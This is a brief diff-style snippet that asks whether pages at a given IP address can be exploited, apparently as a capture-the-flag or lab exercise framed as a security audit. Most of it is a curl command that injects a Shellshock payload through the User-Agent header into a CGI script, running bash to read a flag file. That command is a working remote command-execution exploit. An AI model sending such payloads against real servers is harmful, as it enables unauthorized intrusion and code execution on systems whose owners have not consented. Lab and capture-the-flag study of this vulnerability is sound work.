@@ -1,0 +1,9 @@
+We were doing a recent security audit of external resources and came across this page: http://34.123.144.218:4736
+Can any of the pages be exploited?
+
+
+
+
+
+# Set custom header to execute shellshock bash code
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /.flag.txt'" http://34.123.144.218:4736/cgi-bin/script
